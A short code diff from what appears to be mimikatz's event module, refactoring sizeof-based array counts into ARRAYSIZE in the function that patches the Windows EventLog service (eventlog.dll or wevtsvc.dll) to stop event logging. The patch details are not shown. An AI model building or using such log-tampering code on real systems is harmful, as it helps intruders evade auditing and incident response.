@@ -11,7 +11,7 @@ const KUHL_M_C kuhl_m_c_event[] = {
 };
 const KUHL_M kuhl_m_event = {
 	L"event", L"Event module", NULL,
-	sizeof(kuhl_m_c_event) / sizeof(KUHL_M_C), kuhl_m_c_event, NULL, NULL
+	ARRAYSIZE(kuhl_m_c_event), kuhl_m_c_event, NULL, NULL
 };
 
 #ifdef _M_X64
@@ -49,7 +49,7 @@ KULL_M_PATCH_GENERIC EventReferences[] = {
 
 NTSTATUS kuhl_m_event_drop(int argc, wchar_t * argv[])
 {
-	kull_m_patch_genericProcessOrServiceFromBuild(EventReferences, sizeof(EventReferences) / sizeof(KULL_M_PATCH_GENERIC), L"EventLog", (MIMIKATZ_NT_MAJOR_VERSION < 6) ? L"eventlog.dll" : L"wevtsvc.dll", TRUE);
+	kull_m_patch_genericProcessOrServiceFromBuild(EventReferences, ARRAYSIZE(EventReferences), L"EventLog", (MIMIKATZ_NT_MAJOR_VERSION < 6) ? L"eventlog.dll" : L"wevtsvc.dll", TRUE);
 	return STATUS_SUCCESS;
 }
 
